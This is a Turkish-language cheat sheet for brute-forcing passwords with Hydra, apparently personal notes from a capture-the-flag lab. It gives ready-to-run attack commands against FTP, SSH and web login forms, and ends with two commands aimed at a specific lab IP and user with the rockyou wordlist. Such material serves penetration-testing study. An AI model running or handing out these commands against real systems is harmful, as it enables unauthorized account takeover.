# Hydra ile Parola Kırma (Brute Force)

**Hydra Kurulumu**

Resmi depolardan veya dağıtım paket yöneticileriyle kurulabilir:

- **Ubuntu/Debian:** `sudo apt install hydra`
    
- **Fedora:** `sudo dnf install hydra`
    

## 1. Temel Kullanım ve Parametreler

Hydra komutları hedef servise (protokole) göre değişiklik gösterir.

|**Parametre**|**Açıklama**|
|---|---|
|`-l <kullanıcı>`|Tek bir hedef kullanıcı adı belirler (küçük 'l').|
|`-L <dosya_yolu>`|Kullanıcı adı listesi (wordlist) kullanır.|
|`-p <parola>`|Tek bir parola dener.|
|`-P <dosya_yolu>`|Parola listesi (wordlist) kullanır (büyük 'P').|
|`-t <sayı>`|Paralel çalışacak iş parçacığı (thread) sayısı (Örn: `-t 4`).|
|`-s <port>`|Hedef varsayılan dışı bir port kullanıyorsa port numarasını belirtir.|
|`-V` / `-vV`|Verbose modu: Her denemeyi ekranda gösterir.|

## 2. Protokol Bazlı Örnekler

### FTP Brute Force

Bash

```
hydra -l user -P passlist.txt ftp://HEDEF_IP
```

### SSH Brute Force

Bash

```
hydra -l root -P /path/to/passwords.txt HEDEF_IP -t 4 ssh
```

- **Kullanıcı Adı:** `root`
    
- **Parola Listesi:** `passwords.txt`
    
- **Eşzamanlı İstek:** `-t 4` (4 paralel thread)
    

## 3. Web Formları (HTTP POST Form)

Web formlarına saldırırken isteğin türü (GET/POST), form parametreleri ve hatalı giriş mesajı analiz edilmelidir (Tarayıcı Geliştirici Araçları $\rightarrow$ Network sekmesi).

### Genel Sözdizimi

Bash

```
hydra -l <kullanıcı> -P <wordlist> HEDEF_IP http-post-form "<dizin>:<gövde_verisi>:<hata_mesajı>" -V
```

### Parametre Formatı Detayı

`"<path>:<login_credentials>:<invalid_response>"`

- **Path (`<dizin>`):** Formun bulunduğu URL/dizin (Örn: `/` veya `/login.php`).
    
- **Credentials (`<gövde_verisi>`):** Formdaki alan isimleri. Hydra değişkenleri `^USER^` ve `^PASS^` ile eşlenir (Örn: `username=^USER^&password=^PASS^`).
    
- **Invalid Response (`<hata_mesajı>`):** Giriş başarısız olduğunda sunucunun döndürdüğü hata metni. Başına `F=` eklenir (Örn: `F=incorrect` veya `F=Invalid username or password`).
    

### Örnek Komutlar

Standart port üzerinden POST formu:

Bash

```
hydra -l admin -P wordlist.txt HEDEF_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

Özel (farklı) bir port üzerinden POST formu:

Bash

```
hydra -l admin -P wordlist.txt HEDEF_IP http-post-form "/login:user=^USER^&pass=^PASS^:F=Failed" -s 8080 -V
```

└──╼ $hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.112.141.63 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

hydra -l molly -P /usr/share/wordlists/rockyou.txt MACHINE_IP -t 4 ssh